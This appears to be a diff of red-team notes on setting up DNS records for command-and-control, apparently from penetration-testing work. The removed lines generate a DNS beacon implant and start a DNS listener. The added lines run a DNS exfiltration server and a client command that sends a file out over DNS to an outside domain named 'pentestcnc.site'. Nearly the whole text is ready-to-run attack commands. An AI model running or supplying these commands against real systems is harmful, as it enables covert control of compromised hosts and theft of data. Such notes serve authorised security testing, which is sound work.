@@ -2,7 +2,6 @@ set @ (A) subdomain to the server ip
 set ns1 (A) subdomain to the server ip
 set 1 (NS) record to ns1.domain.com
 
-generate beacon --dns 1.domain.com --seconds 10 --jitter 0 --save /tmp/dns.exe
-dns --domains 1.domain.com
+python3 dnsexfiltrator.py -d 1.pentestcnc.site -p 123456
 
-beacons
+.\dnsExfiltrator.exe C:/Windows/System32/calc.exe 1.pentestcnc.site 123456
